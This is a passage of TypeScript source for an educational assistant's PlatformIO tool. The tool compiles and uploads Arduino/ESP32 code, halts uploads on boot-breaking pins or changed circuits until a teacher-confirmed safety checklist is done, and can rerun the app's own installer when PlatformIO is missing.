  const envs = [...ini.keys()].filter((s) => s.startsWith("env:")).map((s) => s.slice(4))
  const boardDe = (e: string) => ini.get(`env:${e}`)?.get("board") ?? comun?.get("board")
  const porDefecto = (ini.get("platformio")?.get("default_envs") ?? "").split(/[\s,]+/).filter((e) => envs.includes(e))
  const elegidos = env && envs.includes(env) ? [env] : porDefecto.length > 0 ? porDefecto : envs
  const boards = elegidos.map(boardDe).filter((b): b is string => !!b)
  if (boards.length === 0 && envs.length === 0 && comun?.get("board")) boards.push(comun.get("board")!)
  return [...new Set(boards)]
}

/** El `board =` que se va a usar (el primero si hay varios). Se mantiene por compatibilidad. */
export function leerBoard(iniText: string, env?: string): string | null {
  return placasElegidas(iniText, env)[0] ?? null
}

const CARPETAS_QUE_NO = new Set(["examples", "example", "extras", "test", "tests", "docs", "doc"])

/**
 * Todo el codigo del proyecto: `src/` (o el `src_dir`), `include/` (o el
 * `include_dir`) y `lib/`, recursivo. No sigue carpetas que son links (pueden
 * salir del proyecto o dar vueltas) ni entra a los ejemplos de las librerias de
 * `lib/`, que traen sus propios pinMode. Lo que no se puede leer se ANOTA: el
 * analisis queda incompleto y el checklist va siempre (falla cerrado).
 */
function leerFuentes(cwd: string, iniText: string): { archivos: Archivo[]; ilegibles: string[]; hayCarpetas: boolean } {
  const pio = leerIni(iniText).get("platformio")
  const carpeta = (clave: string, porDefecto: string) => {
    const v = (pio?.get(clave) ?? porDefecto).replace(/\$\{PROJECT_DIR\}|\$PROJECT_DIR/g, cwd).trim()
    return isAbsolute(v) ? v : join(cwd, v)
  }
  const raices = [...new Set([carpeta("include_dir", "include"), carpeta("src_dir", "src"), carpeta("lib_dir", "lib")])]
  const archivos: Archivo[] = []
  const ilegibles: string[] = []
  let hayCarpetas = false
  const nombreRel = (r: string) => (r.startsWith(cwd) ? r.slice(cwd.length).replace(/^[\\/]/, "") : r)
  const recorrer = (dir: string, prof: number) => {
    if (prof > 6) return
    let nombres: string[]
    try {
      nombres = readdirSync(dir).sort()
    } catch {
      ilegibles.push(nombreRel(dir))
      return
    }
    for (const nombre of nombres) {
      const ruta = join(dir, nombre)
      let st: ReturnType<typeof lstatSync>
      try {
        st = lstatSync(ruta)
      } catch {
        ilegibles.push(nombreRel(ruta))
        continue
      }
      if (st.isDirectory()) {
        if (!nombre.startsWith(".") && !CARPETAS_QUE_NO.has(nombre.toLowerCase())) recorrer(ruta, prof + 1)
      } else if (/\.(ino|cpp|c|h|hpp)$/i.test(nombre)) {
        try {
          archivos.push({ nombre: nombreRel(ruta), texto: readFileSync(ruta, "utf8") })
        } catch {
          ilegibles.push(nombreRel(ruta))
        }
      }
    }
  }
  for (const r of raices) {
    if (!existsSync(r)) continue
    hayCarpetas = true
    recorrer(r, 0)
  }
  // Los .h primero: los #define de configuracion suelen vivir ahi.
  archivos.sort((a, b) => Number(!/\.h(pp)?$/i.test(a.nombre)) - Number(!/\.h(pp)?$/i.test(b.nombre)) || (a.nombre < b.nombre ? -1 : 1))
  return { archivos, ilegibles, hayCarpetas }
}

export interface AnalisisProyecto {
  familia: FamiliaPlaca | null
  hallazgos: Hallazgo[]
  huella: Huella
  rasgos: Rasgos
  /** Lo que no se pudo leer o analizar. Si hay algo, el checklist va siempre y no se guarda estado. */
  incompleto: string[]
}

/** La huella fija de un analisis incompleto: su codigo no depende de lo que no se pudo leer. */
export const HUELLA_INCOMPLETA: Huella = { placa: "analisis-incompleto", entradas: ["analisis-incompleto"] }

/** Junta los analisis de varias placas (varios envs sin uno elegido). */
function unirAnalisis(partes: Array<{ board: string; familia: FamiliaPlaca | null; hallazgos: Hallazgo[]; huella: Huella; rasgos: Rasgos }>): Omit<AnalisisProyecto, "incompleto"> {
  const vistos = new Set<string>()
  const hallazgos = partes.flatMap((p) => p.hallazgos).filter((h) => (vistos.has(h.texto) ? false : (vistos.add(h.texto), true)))
  const orden = { bloqueo: 0, aviso: 1, nota: 2 }
  const familias = new Set(partes.map((p) => p.familia))
  return {
    familia: familias.size === 1 ? [...familias][0]! : null,
    hallazgos: hallazgos.sort((a, b) => orden[a.nivel] - orden[b.nivel]),
    huella: {
      placa: partes.map((p) => p.board).sort().join("+"),
      entradas: [...new Set(partes.flatMap((p) => p.huella.entradas))].sort(),
    },
    rasgos: {
      wifi: partes.some((p) => p.rasgos.wifi),
      dht: partes.some((p) => p.rasgos.dht),
      servo: partes.some((p) => p.rasgos.servo),
      rele: partes.some((p) => p.rasgos.rele),
    },
  }
}

/**
 * Lo que el codigo del proyecto dice de los pines. null SOLO si no hay
 * platformio.ini o no hay ninguna carpeta de codigo (ahi no hay nada que cargar
 * todavia). Cualquier otra falla devuelve un analisis INCOMPLETO, que hace que
 * flash/both pidan el checklist: antes un archivo ilegible apagaba el bloqueo
 * de la flash y el checklist a la vez.
 */
export function analizarProyecto(cwd: string, env?: string): AnalisisProyecto | null {
  const ini = join(cwd, "platformio.ini")
  if (!existsSync(ini)) return null
  let iniText: string
  try {
    iniText = readFileSync(ini, "utf8")
  } catch {
    return { familia: null, hallazgos: [], huella: HUELLA_INCOMPLETA, rasgos: { wifi: false, dht: false, servo: false, rele: false }, incompleto: ["platformio.ini"] }
  }
  try {
    const { archivos, ilegibles, hayCarpetas } = leerFuentes(cwd, iniText)
    if (!hayCarpetas || (archivos.length === 0 && ilegibles.length === 0)) return null
    const boards = placasElegidas(iniText, env)
    const partes = (boards.length > 0 ? boards : ["?"]).map((board) => {
      const familia = familiaDePlaca(board)
      const p = preparar(archivos, board)
      const usos = usosDe(p, familia)
      return { board, familia, hallazgos: hallazgosDe(p, usos, familia), ...huellaDe(p, usos, board, familia) }
    })
    return { ...unirAnalisis(partes), incompleto: ilegibles }
  } catch {
    return { familia: null, hallazgos: [], huella: HUELLA_INCOMPLETA, rasgos: { wifi: false, dht: false, servo: false, rele: false }, incompleto: ["(el análisis falló)"] }
  }
}

// ── 5. La ultima carga ──────────────────────────────────────────────────────

/*
 * QUE SE GUARDA Y DONDE.
 *
 * En el proyecto, `.pio/tecnia/ultima-carga.json`: la huella, el puerto, el hwid
 * que da `pio device list` y la carpeta del proyecto. Y en la compu,
 * `~/.config/opencode/tecnia-cargas.json`: por puerto, que proyecto se cargo
 * ultimo, pero GUARDADO COMO HASH (ni la ruta ni el hwid quedan legibles: la ruta
 * puede tener el nombre de una persona, y el desinstalador no conoce este
 * archivo).
 *
 * Con eso, ademas del circuito, se pide el checklist si se carga a OTRA placa
 * (otro puerto u otro hwid) o si en esa placa lo ultimo que se cargo fue OTRO
 * proyecto: el circuito que esta en la mesa puede no ser el de este codigo.
 *
 * EL ORDEN. El bloqueo de la flash y la comparacion del circuito van ANTES de
 * buscar la placa (no hace falta la placa para saberlo, y asi no se toca nada).
 * La comparacion de la placa necesita el puerto, asi que va DESPUES de
 * detectPort y antes de cargar.
 */
export interface UltimaCarga extends Huella {
  puerto?: string
  hwid?: string
  proyecto?: string
}

const rutaUltimaCarga = (cwd: string) => join(cwd, ".pio", "tecnia", "ultima-carga.json")
const rutaCargasGlobal = () => join(process.env.XDG_CONFIG_HOME || join(homedir(), ".config"), "opencode", "tecnia-cargas.json")
const hash = (s: string) => createHash("sha256").update(s).digest("hex").slice(0, 16)

/** La ultima carga que termino bien en este proyecto, o null. */
export function leerUltimaCarga(cwd: string): UltimaCarga | null {
  try {
    const d = JSON.parse(readFileSync(rutaUltimaCarga(cwd), "utf8")) as Partial<UltimaCarga>
    if (typeof d.placa !== "string" || !Array.isArray(d.entradas)) return null
    const str = (x: unknown) => (typeof x === "string" ? x : undefined)
    return {
      placa: d.placa,
      entradas: d.entradas.filter((e): e is string => typeof e === "string"),
      puerto: str(d.puerto),
      hwid: str(d.hwid),
      proyecto: str(d.proyecto),
    }
  } catch {
    return null
  }
}

function leerCargasGlobal(): Record<string, { proyecto: string; hwid: string | null }> {
  try {
    const d = JSON.parse(readFileSync(rutaCargasGlobal(), "utf8"))
    return d && typeof d === "object" ? d : {}
  } catch {
    return {}
  }
}

/**
 * Solo se llama despues de una carga con codigo 0. Si no se puede escribir, la
 * proxima carga vuelve a pedir el checklist: es el lado seguro. Con un analisis
 * incompleto (o sin analisis) NO se guarda la huella del proyecto, pero SI el
 * registro de la placa: ahora en esa placa esta este proyecto.
 */
function guardarUltimaCarga(cwd: string, a: AnalisisProyecto | null, puerto: string, hwid: string | undefined): void {
  const proyecto = resolve(cwd)
  if (a && a.incompleto.length === 0) guardarHuella(cwd, a.huella, puerto, hwid, proyecto)
  try {
    const global = leerCargasGlobal()
    global[puerto] = { proyecto: hash(proyecto), hwid: hwid ? hash(hwid) : null }
    mkdirSync(join(rutaCargasGlobal(), ".."), { recursive: true })
    writeFileSync(rutaCargasGlobal(), JSON.stringify(global, null, 2))
  } catch {
    /* sin el registro global solo se pierde el aviso de "otro proyecto" */
  }
}

function guardarHuella(cwd: string, h: Huella, puerto: string, hwid: string | undefined, proyecto: string): void {
  try {
    mkdirSync(join(cwd, ".pio", "tecnia"), { recursive: true })
    writeFileSync(
      rutaUltimaCarga(cwd),
      JSON.stringify({ placa: h.placa, entradas: h.entradas, puerto, hwid: hwid ?? null, proyecto, cargado: new Date().toISOString() }, null, 2),
    )
  } catch {
    /* lado seguro: se vuelve a pedir el checklist */
  }
}

const listaHallazgos = (hs: Hallazgo[]) => hs.map((h) => `- ${h.texto}`).join("\n")

/** Despues de cargar, los avisos que quedan (no hay bloqueos: esos no llegan a cargar). */
const avisosTrasCargar = (a: AnalisisProyecto | null) =>
  a && a.hallazgos.length > 0 ? `\n\n**Contale al docente estos pines:**\n${listaHallazgos(a.hallazgos)}` : ""

const avisoIncompleto = (a: AnalisisProyecto) =>
  `No pude leer todo el código del proyecto (${a.incompleto.join(", ")}): los avisos de pines pueden estar incompletos.`

/**
 * Lo que dice `compile` cuando termino bien. Si hay un bloqueo NO dice "listo
 * para cargar" a secas; y nunca dice que los pines esten bien.
 *
 * Responde EXACTAMENTE lo mismo que la 0.4.7 cuando: no hay hallazgos, el
 * analisis esta completo, y no corresponde el recordatorio (el codigo no usa
 * WiFi, DHT, Servo ni relé, o la huella es igual a la de la ultima carga).
 */
export function mensajeCompilacion(a: AnalisisProyecto | null, previa: Huella | null): string {
  const OK = "Compilacion exitosa. El codigo esta listo para cargar al dispositivo."
  if (!a) return OK
  const bloqueos = a.hallazgos.filter((h) => h.nivel === "bloqueo")
  const resto = a.hallazgos.filter((h) => h.nivel !== "bloqueo")
  let msg =
    bloqueos.length > 0
      ? "Compilacion exitosa, pero NO se puede cargar así: hay un pin que deja la placa sin arrancar. Cargar va a frenar hasta que se cambie.\n\n" +
        `**Hay que cambiar antes de cargar:**\n${listaHallazgos(bloqueos)}`
      : OK
  if (resto.length > 0) msg += `\n\n**Revisá estos pines con el docente antes de cargar:**\n${listaHallazgos(resto)}`
  if (a.incompleto.length > 0) msg += `\n\n${avisoIncompleto(a)}`
  const skills = skillsParaRasgos(a.rasgos)
  if (skills.length > 0 && huellaCambio(a.huella, previa)) {
    msg += `\n\nRecordatorio: el circuito cambió; si todavía no los cargaste, activá los skills ${skills.map((s) => `\`${s}\``).join(", ")} antes de explicarlo o cargarlo.`
  }
  return msg
}

const coincide = (checklist: string | undefined, ...codigos: string[]) => codigos.includes((checklist ?? "").trim().toLowerCase())

function pedirChecklist(motivo: string, lo: string, codigo: string, checklist: string | undefined): string {
  return (
    `FRENÉ LA CARGA: antes de cargar hay un paso obligado, el checklist de seguridad. ${motivo}\n\n` +
    (lo ? `${lo}\n\n` : "") +
    (checklist ? "El código de checklist que pasaste no corresponde a este circuito.\n\n" : "") +
    "Activá el skill `checklist-seguridad` y hacé con el docente un checklist CORTO y a medida, en formato sí/no. " +
    "Esperá que confirme. Recién cuando confirme, volvé a llamar a `platformio` con la misma acción y " +
    `\`checklist: "${codigo}"\`. No pases ese código sin haber hecho el checklist: el tool no puede comprobarlo, depende de vos.`
  )
}

/**
 * El primer freno de `flash`/`both`, ANTES de buscar la placa. null si se puede
 * seguir. Primero los pines que rompen (no hay codigo que los levante); despues
 * el checklist si el analisis esta incompleto (siempre) o si el circuito tiene
 * altas nuevas desde la ultima carga de este proyecto.
 */
export function frenoAntesDeCargar(a: AnalisisProyecto | null, previa: Huella | null, checklist: string | undefined): string | null {
  if (!a) return null
  const bloqueos = a.hallazgos.filter((h) => h.nivel === "bloqueo")
  if (bloqueos.length > 0) {
    return (
      "NO CARGUÉ NADA: el código usa un pin que deja la placa sin arrancar.\n\n" +
      `${listaHallazgos(bloqueos)}\n\n` +
      "Contale al docente qué pin es y por qué, cambialo en el código y en el cableado, compilá de nuevo y recién ahí cargá."
    )
  }
  if (a.incompleto.length > 0) {
    const codigo = codigoChecklist(HUELLA_INCOMPLETA)
    if (coincide(checklist, codigo)) return null
    return pedirChecklist(`${avisoIncompleto(a)} Sin eso no sé qué cambió en el circuito, así que el checklist va en cada carga hasta que se pueda leer.`, "", codigo, checklist)
  }
  const altas = altasNuevas(a.huella, previa)
  if (altas.length === 0) return null
  const codigo = codigoChecklist(a.huella)
  if (coincide(checklist, codigo)) return null
  return pedirChecklist(
    "El circuito cambió desde la última carga de este proyecto.",
    `Lo nuevo: ${altas.map((e) => describirEntrada(e, a.familia)).join(", ")}.`,
    codigo,
    checklist,
  )
}

/**
 * El segundo freno, DESPUES de detectPort: la placa. Solo si el codigo maneja
 * algun pin (un blink del LED de la placa no tiene nada que revisar) y el
 * analisis esta completo (si no, ya freno el primero). Se acepta el codigo del
 * primer freno: si recien se hizo el checklist para este circuito, no se pide
 * otro.
 */
export function frenoPorPlaca(
  a: AnalisisProyecto | null,
  previa: UltimaCarga | null,
  cwd: string,
  puerto: string,
  hwid: string | undefined,
  checklist: string | undefined,
  cargas: Record<string, { proyecto: string; hwid: string | null }> = leerCargasGlobal(),
): string | null {
  if (!a || a.incompleto.length > 0 || a.huella.entradas.length === 0) return null
  const codigoCircuito = codigoChecklist(a.huella)
  const codigo = codigoChecklist({ placa: `${a.huella.placa}@${puerto}|${hwid ?? ""}`, entradas: a.huella.entradas })
  if (coincide(checklist, codigoCircuito, codigo)) return null
  const proyecto = hash(resolve(cwd))
  const otraPlaca = !previa?.puerto || previa.puerto !== puerto || (!!previa.hwid && !!hwid && previa.hwid !== hwid)
  const registro = cargas[puerto]
  const otroProyecto = !!registro && registro.proyecto !== proyecto
  if (!otraPlaca && !otroProyecto) return null
  const motivo = otroProyecto
    ? `En la placa de ${puerto} lo último que se cargó fue OTRO proyecto: el circuito que está conectado puede no ser el de este código.`
    : `La última carga de este proyecto fue en otra placa o por otro puerto, y ahora va a ${puerto}.`
  return pedirChecklist(motivo, `Lo que maneja este código: ${a.huella.entradas.map((e) => describirEntrada(e, a.familia)).join(", ")}.`, codigo, checklist)
}

/**
 * ESTE MENSAJE NO DA EL LINK DE LA DOCUMENTACION OFICIAL, Y ES A PROPOSITO.
 *
 * Paso en una capacitacion: de decenas de maquinas, UNA se quedo sin PlatformIO.
 * La docente corrio `/diagnostico` y el bot le contesto que instalara Visual
 * Studio Code y la extension PlatformIO IDE.
 *
 * Eso no arregla nada aca. Tecnia Bot usa PlatformIO CORE, que lo instala su
 * propio instalador. El consejo mandaba a la directora de una escuela a bajar
 * cientos de megas de otro producto para seguir sin poder compilar.
 *
 * Y el modelo no invento de la nada: la pagina oficial ofrece cinco metodos, y
 * el mas difundido en internet es el de VS Code. Le dimos un link con opciones
 * y le pedimos que eligiera. Eligio la que cualquiera hubiera elegido.
 *
 * Aca hay UNA sola forma de arreglarlo, y ya esta instalada en la maquina.
 */
function pioNoEncontrado() {
  return (
    "PlatformIO no esta instalado.\n\n" +
    "COMO SE ARREGLA (no hay que instalar nada aparte, ni VS Code, ni Python a mano):\n" +
    "  1. Instalalo VOS ahora: llama a este mismo tool con action: \"reparar\".\n" +
    "     Avisale antes al usuario que tarda unos minutos y baja unos 60 MB (mas de 1 GB si faltan las herramientas de ESP32/UNO).\n" +
    "  2. Plan B, solo si la reparacion desde aca no pudo correr (el tool lo dice):\n" +
    "     Menu inicio -> 'Reparar Tecnia Bot'. Hace exactamente lo mismo.\n" +
    "     En Linux/Mac, el tool devuelve el comando exacto (bash install/bootstrap.sh).\n" +
    "  3. Si despues de eso sigue faltando, es la RED y no la maquina:\n" +
    "     menu inicio -> 'Diagnostico de Tecnia Bot'. Deja un .txt que dice si\n" +
    "     esta maquina llega a pypi.org, que es de donde se baja.\n\n" +
    "Mientras tanto Tecnia Bot sirve igual para explicar, dibujar circuitos y\n" +
    "repartir fichas. Lo unico que no puede es compilar y cargar a la placa."
  )
}

export default tool({
  description: `Compilar y cargar codigo Arduino/ESP32 con PlatformIO. Detecta el puerto automaticamente.

Acciones:
- compile: compilar el proyecto actual
- flash: cargar el codigo en el dispositivo
- both: compilar y cargar en un solo paso
- monitor: abre una ventana de terminal aparte con el monitor serial ya corriendo. El puerto se detecta solo (si hay varias placas, pide elegir). Los baudios: si no pasas 'baud', lee el monitor_speed del platformio.ini de la carpeta actual (del environment que indiques, o el primero que tenga uno) y si no hay ninguno usa 9600. NO requiere codigo cargado: sirve para ver los datos que manda la placa y para mandarle teclas (ej: comandar un servo desde el teclado). Cuando el usuario pida "ver el monitor serial", "abrir la terminal serial" o similar, llama a esta accion DIRECTAMENTE, sin pedir ni crear un proyecto.
- diagnostico: verificar entorno (PlatformIO instalado, dispositivos conectados)
- reparar: instala PlatformIO Core cuando falta, corriendo el instalador de Tecnia Bot (en Linux/Mac devuelve el comando exacto para hacerlo a mano). Tarda unos minutos y baja unos 60 MB (mas de 1 GB si faltan las herramientas de ESP32/UNO): avisale antes.

Pines y checklist: compile avisa de pines problematicos; en ESP32, un pin de la memoria flash frena la carga. flash y both frenan si el circuito o la placa cambiaron desde la ultima carga: hacer el checklist de seguridad con el docente es un paso obligado, y despues se vuelve a llamar con el parametro 'checklist' que da el tool.`,
  args: {
    action: tool.schema
      .enum(["compile", "flash", "both", "monitor", "diagnostico", "reparar"])
      .describe(
        "compile: compila el proyecto. flash: lo carga a la placa. both: las dos. " +
        "monitor: abre el monitor serie. diagnostico: informa que hay y que falta. " +
        "reparar: INSTALA PlatformIO cuando falta, corriendo el instalador de Tecnia Bot. " +
        "Usa 'reparar' apenas veas que falta PlatformIO y el usuario quiera compilar o " +
        "cargar codigo: hacelo vos. El acceso directo del menu inicio, Reparar Tecnia Bot, " +
        "es el plan B, solo si desde aca no se pudo correr. Tarda unos minutos y baja unos " +
        "60 MB, o mas de 1 GB si faltan las herramientas de ESP32/UNO, asi que avisale antes de arrancar."
      ),
    port: tool.schema
      .string()
      .optional()
      .describe("Puerto serial explicito (ej: COM3, /dev/ttyUSB0). Se detecta automaticamente si no se indica."),
    baud: tool.schema
      .number()
      .optional()
      .describe(
        "Velocidad del monitor serial en baudios. Si no se indica, se usa el monitor_speed del platformio.ini de la carpeta actual y, si no hay, 9600. Debe coincidir con el valor de Serial.begin(...) del sketch (ej: 115200 para muchos ESP32).",
      ),
    environment: tool.schema
      .string()
      .optional()
      .describe("Environment del platformio.ini (ej: uno, esp32dev). Opcional."),
    project_path: tool.schema
      .string()
      .optional()
      .describe("Ruta al proyecto PlatformIO. Por defecto usa el directorio actual."),
    checklist: tool.schema
      .string()
      .optional()
      .describe(
        "Codigo de 6 caracteres que te da flash o both cuando frenan porque el circuito cambio desde la ultima carga. " +
        "Pasalo SOLO despues de hacer el checklist de seguridad con el docente y de que confirme. Si el tool no te lo pidio, no lo pases.",
      ),
  },
  async execute(args, ctx) {
    const cwd = args.project_path ?? ctx.directory
    const signal = ctx.abort
    const envFlag = args.environment ? ["-e", args.environment] : []

    // Compilar y cargar son los dos comandos largos (descargan toolchain la primera vez).
    // Si faltan las herramientas de la placa, la primera compilacion las baja en
    // silencio: se avisa en el titulo de la tool para que no parezca un cuelgue.
    let faltaban: string[] = []
    const avisarDescarga = () => {
      try {
        const ini = join(cwd, "platformio.ini")
        faltaban = existsSync(ini) ? herramientasFaltantes(readFileSync(ini, "utf-8"), coreDir()) : []
      } catch {
        faltaban = []
      }
      if (faltaban.length > 0 && typeof ctx.metadata === "function") {
        ctx.metadata({
          title: `Bajando las herramientas de ${faltaban.join(" y ")} por primera vez (puede tardar varios minutos)`,
        })
      }
    }
    const compilar = () => {
      avisarDescarga()
      return run(["pio", "run", ...envFlag], cwd, signal, timeoutCompilarMs(faltaban))
    }
    /*
     * `pio run --target upload` COMPILA antes de cargar, asi que en `flash` solo
     * (sin compilar antes) baja las mismas herramientas que compilar y necesita el
     * mismo aviso y el mismo tope. Antes `flash` esperaba 15 minutos en silencio
     * en la misma computadora donde `compile` cortaba a los 3 y explicaba.
     *
     * Despues de un `compilar()` que termino bien (en `both`) ya no hay nada que
     * bajar para compilar: ahi se espera el tope largo y no se vuelve a avisar.
     */
    let compiloAntes = false
    const timeoutCarga = () => (compiloAntes ? timeoutLargoMs() : timeoutCompilarMs(faltaban))
    const cargar = (puerto: string) => {
      if (!compiloAntes) avisarDescarga()
      return run(["pio", "run", "--target", "upload", "--upload-port", puerto, ...envFlag], cwd, signal, timeoutCarga())
    }

    /*
     * Primero se traduce sobre el texto COMPLETO (el patron puede estar en
     * cualquier linea) y recien despues se recorta lo que se muestra: si fuera
     * al reves, un error que quedo fuera de la ventana perderia su traduccion.
     */
    const explicarFalla = (r: RunResult) => {
      const traduccion = traducirError(r.stderr, r.stdout)
      const original = recortarSalida(r.stderr.trim() ? r.stderr : r.stdout)
      return `**Que significa:**\n${traduccion}\n\n**Error original:**\n\`\`\`\n${original}\n\`\`\``
    }
    // Timeout o cancelacion no son errores de compilacion: no se traducen, se explican.
    // Si la compilacion ya habia terminado bien, un corte en la carga no es de
    // herramientas faltantes: tiene su propio mensaje, sin pendrive.
    const noTermino = (r: RunResult, que: "compilar" | "cargar el codigo"): string | null =>
      r.code === CODIGO_TIMEOUT
        ? que === "cargar el codigo" && compiloAntes
          ? mensajeTimeoutCarga(timeoutCarga())
          : mensajeTimeout(que, que === "compilar" ? timeoutCompilarMs(faltaban) : timeoutCarga(), faltaban)
        : r.code === CODIGO_CANCELADO
          ? `Se cancelo la accion antes de terminar de ${que}.`
          : null

    // `diagnostico` informa que falta, y `reparar` existe PARA cuando falta: si
    // el pre-chequeo corriera tambien para `reparar`, devolveria "anda al menu
    // inicio" y la rama de reparacion seria inalcanzable justo en el unico caso
    // para el que se escribio. Paso en la VM: /reparar no instalaba nada.
    if (args.action !== "diagnostico" && args.action !== "reparar") {
      const check = await run(["pio", "--version"], cwd, signal)
      if (check.code === 127 || check.stderr.includes("command not found") || check.stderr.includes("is not recognized")) {
        return pioNoEncontrado()
      }
    }

    switch (args.action) {
      case "reparar": {
        /*
         * POR QUE EXISTE ESTA ACCION.
         *
         * Una docente miro el reporte que le decia "anda al menu inicio y busca
         * Reparar Tecnia Bot", y contesto: "vos tenes platformio, hacelo".
         *
         * Tenia razon. Le estabamos pidiendo que fuera a buscar un acceso directo
         * para correr un script que el bot puede correr solo. Cada paso que le
         * pedimos a alguien que ya nos esta hablando es un paso donde se pierde.
         *
         * Y hay un segundo motivo, que para nosotros vale igual: el bootstrap
         * escribe POR QUE fallo, y si lo corre el bot ese texto aparece en la
         * conversacion. Estuvimos tres rondas pidiendo un log por foto.
         */
        if (process.platform !== "win32") {
          return (
            "La reparacion automatica es solo para Windows (corre el bootstrap.ps1 del instalador). " +
            "En Linux o Mac se arregla con UN comando, en una terminal, parado en la carpeta del proyecto " +
            "(la que se clono al instalar, `Agente-editor-inet`):\n\n" +
            "```\nbash install/bootstrap.sh\n```\n\n" +
            "Instala lo que falte (PlatformIO Core incluido) y no toca lo que ya esta. " +
            "Si esa carpeta ya no existe: " + CLONAR_REPO
          )
        }

        const appDir = join(process.env.LOCALAPPDATA ?? "", "TecniaBot")
        const bootstrap = join(appDir, "install", "bootstrap.ps1")
        if (!existsSync(bootstrap)) {
          return (
            "No encuentro el instalador en esta maquina (`" + bootstrap + "`).\n\n" +
            "Suele pasar cuando Tecnia Bot se instalo a mano o con una version muy vieja. " +
            REINSTALAR_DESDE_CERO
          )
        }

        /*
         * SE MIRA ANTES Y DESPUES, y no sirve mirar solo despues.
         *
         * La primera version de esto contestaba "Listo: PlatformIO quedo
         * instalado" con solo encontrarlo al final. Si el bootstrap NO llegaba a
         * arrancar -powershell fuera del PATH del proceso, una politica que lo
         * bloquea, el antivirus- y PlatformIO ya estaba de antes, el tool
         * informaba un exito por una reparacion QUE NUNCA CORRIO.
         *
         * Es exactamente el OK falso que este mismo archivo le prohibe al modelo,
         * cometido por el codigo que se lo prohibe. Un dia despues de escribir la
         * regla.
         *
         * La diferencia importa: si algo mas seguia roto, el docente se iba
         * convencido de que la reparacion se hizo.
         */
        const pioAntes = pioDisponible()

        // El bootstrap baja e instala PlatformIO: son minutos, como una compilacion.
        const result = await run(
          ["powershell", "-ExecutionPolicy", "Bypass", "-NoProfile", "-File", bootstrap],
          appDir,
          signal,
          timeoutLargoMs(),
        )

        // 127 es lo que devuelve run() cuando ni siquiera pudo lanzar el proceso.
        if (result.code === 127) {
          return (
            "NO PUDE CORRER LA REPARACION: no se pudo lanzar PowerShell desde aca.\n\n" +
            (pioAntes
              ? "Ojo: PlatformIO YA estaba instalado de antes, asi que si algo anda es por eso y no por esta reparacion.\n\n"
              : "") +
            "Se arregla igual desde afuera: menu inicio -> 'Reparar Tecnia Bot'. Hace lo mismo que esto."
          )
        }

        // Se vuelve a resolver sin cache: el chequeo inicial de `pio --version`
        // corrio cuando todavia no estaba instalado.
        const pioAhora = pioDisponible()
        // Las ultimas lineas, que es donde el bootstrap dice como le fue. El log
        // entero son cientos de lineas de descarga que no le sirven a nadie.
        const salida = (result.stdout + "\n" + result.stderr)
          .split("\n")
          .map((l) => l.trimEnd())
          .filter((l) => l.length > 0)
          .slice(-25)
          .join("\n")

        if (pioAhora) {
          // Se distingue "lo instale" de "ya estaba", porque no son lo mismo para
          // el que pregunta. Decir "listo, lo instale" cuando no se instalo nada
          // hace que la proxima vez que algo falle, la reparacion parezca hecha.
          const encabezado = pioAntes
            ? "La reparacion corrio. PlatformIO ya estaba instalado, asi que no hizo falta bajarlo de nuevo."
            : "Listo: PlatformIO quedo instalado. Ya se puede compilar y cargar codigo a la placa."
          return encabezado + "\n\n```\n" + salida + "\n```"
        }

        return (
          "La reparacion corrio pero PlatformIO sigue sin instalarse.\n\n" +
          "Esto es lo que dijo el instalador — leelo y contale al usuario que dice, con sus palabras:\n\n" +
          "```\n" + salida + "\n```\n\n" +
          "Las dos causas habituales:\n" +
          "- **El senuelo de la Microsoft Store**: si aparece 'No hay un Python usable' o " +
          "'instalar desde el Microsoft Store', se apaga en Configuracion > Aplicaciones > " +
          "Alias de ejecucion de aplicaciones, destildando python.exe y python3.exe.\n" +
          "- **La red de la escuela**: PlatformIO se baja de pypi.org, un dominio que los " +
          "filtros de contenido bloquean sin avisar. Se confirma con 'Diagnostico de Tecnia Bot' " +
          "en el menu inicio."
        )
      }

      case "compile": {
        const result = await compilar()
        if (result.code === 0) return mensajeCompilacion(analizarProyecto(cwd, args.environment), leerUltimaCarga(cwd))
        return noTermino(result, "compilar") ?? `Hubo un error al compilar:\n\n${explicarFalla(result)}`
      }

      case "flash": {
        // Orden: pines y circuito ANTES de buscar la placa; la placa, despues (ver "QUE SE GUARDA Y DONDE").
        const analisis = analizarProyecto(cwd, args.environment)
        const previa = leerUltimaCarga(cwd)
        const freno = frenoAntesDeCargar(analisis, previa, args.checklist)
        if (freno) return freno
        let puerto = args.port
        let hwid: string | undefined
        if (!puerto) {
          const detected = await detectPort(cwd, signal)
          if ("error" in detected) return detected.error
          puerto = detected.port
          hwid = detected.hwid
        }
        const frenoPlaca = frenoPorPlaca(analisis, previa, cwd, puerto, hwid, args.checklist)
        if (frenoPlaca) return frenoPlaca
        const result = await cargar(puerto)
        if (result.code === 0) {
          guardarUltimaCarga(cwd, analisis, puerto, hwid)
          return `Codigo cargado exitosamente en ${puerto}.` + avisosTrasCargar(analisis)
        }
        return noTermino(result, "cargar el codigo") ?? `Error al cargar el codigo:\n\n${explicarFalla(result)}`
      }

      case "both": {
        const compile = await compilar()
        if (compile.code !== 0) {
          return noTermino(compile, "compilar") ?? `Error al compilar (no se intento cargar):\n\n${explicarFalla(compile)}`
        }
        compiloAntes = true
        const analisis = analizarProyecto(cwd, args.environment)
        const previa = leerUltimaCarga(cwd)
        const freno = frenoAntesDeCargar(analisis, previa, args.checklist)
        if (freno) return `La compilacion fue bien. ${freno}`
        let puerto = args.port
        let hwid: string | undefined
        if (!puerto) {
          const detected = await detectPort(cwd, signal)
          if ("error" in detected) return detected.error
          puerto = detected.port
          hwid = detected.hwid
        }
        const frenoPlaca = frenoPorPlaca(analisis, previa, cwd, puerto, hwid, args.checklist)
        if (frenoPlaca) return `La compilacion fue bien. ${frenoPlaca}`
        const flash = await cargar(puerto)
        if (flash.code === 0) {
          guardarUltimaCarga(cwd, analisis, puerto, hwid)
          return `Compilacion y carga exitosa en ${puerto}.` + avisosTrasCargar(analisis)
        }
        return (
          noTermino(flash, "cargar el codigo") ??
          `La compilacion fue bien pero hubo un error al cargar:\n\n${explicarFalla(flash)}`
        )
      }

      case "monitor": {
        const baudDelIni = args.baud ? null : monitorSpeedDelProyecto(cwd, args.environment)
        const baud = args.baud ?? baudDelIni ?? 9600
        const origenBaud = args.baud
          ? ""
          : baudDelIni
            ? " (el monitor_speed de tu platformio.ini)"
            : " (el valor por defecto: si tu sketch usa otro Serial.begin, pedime esos baudios)"

        // Resolvemos el puerto automaticamente (el docente no tiene que saber que es COM3).
        let puerto = args.port
        if (!puerto) {
          const detected = await detectPort(cwd, signal)
          if ("error" in detected) {
            // detected.error ya trae el mensaje completo (sin placa -> pedi conectar USB;
